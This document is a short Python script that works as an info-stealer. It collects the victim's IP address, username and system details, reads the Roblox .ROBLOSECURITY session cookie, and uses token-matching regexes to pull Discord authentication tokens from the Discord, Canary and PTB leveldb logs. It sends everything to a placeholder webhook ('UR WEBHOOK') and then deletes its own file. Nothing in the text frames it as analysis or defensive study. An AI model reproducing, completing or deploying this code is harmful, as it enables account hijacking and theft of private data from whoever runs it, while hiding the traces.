def run():
    import os, platform, psutil, json, requests, re
    from getpass import getuser
    from platform import node as get_pc_name

    def get_ip():
        try:
            return requests.get('https://api.ipify.org?format=json', timeout=5).json()['ip']
        except:
            return "IP fetch failed"

    def get_system_info():
        return {
            'PC Name': get_pc_name(),
            'Username': getuser(),
            'OS': platform.system(),
            'OS Release': platform.release(),
            'OS Version': platform.version(),
            'Architecture': platform.machine(),
            'Processor': platform.processor(),
            'RAM': f"{round(psutil.virtual_memory().total / (1024 ** 3))} GB"
        }

    def get_roblox_token():
        try:
            path = os.path.expanduser('~/AppData/Local/Roblox/PlayerData.json')
            if os.path.exists(path):
                with open(path) as f: return json.load(f).get('.ROBLOSECURITY', 'Not found')
            return "Roblox file not found"
        except:
            return "Error"

    def extract_discord_tokens(path):
        pat1 = re.compile(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}")
        pat2 = re.compile(r"mfa\.[\w-]{84}")
        found = []
        if not os.path.exists(path): return []
        for fname in os.listdir(path):
            if not fname.endswith('.log') and not fname.endswith('.ldb'): continue
            try:
                with open(os.path.join(path, fname), errors='ignore') as f:
                    txt = f.read()
                    found += pat1.findall(txt) + pat2.findall(txt)
            except: continue
        return list(set(found))

    def get_discord_tokens():
        base = os.path.expanduser('~/AppData/Roaming')
        paths = ['Discord', 'discordcanary', 'discordptb']
        result = {}
        for app in paths:
            full = os.path.join(base, app, 'Local Storage', 'leveldb')
            tokens = extract_discord_tokens(full)
            if tokens: result[app] = tokens
        return result if result else "No tokens found"

    def send(webhook_url, data):
        try:
            requests.post(webhook_url, json={"content": f"```json\n{json.dumps(data, indent=4)}\n```"})
        except: pass

    data = {
        "IP": get_ip(),
        "System": get_system_info(),
        "Roblox Token": get_roblox_token(),
        "Discord Tokens": get_discord_tokens()
    }

    send("UR WEBHOOK", data)

    try: os.remove(__file__)
    except: pass
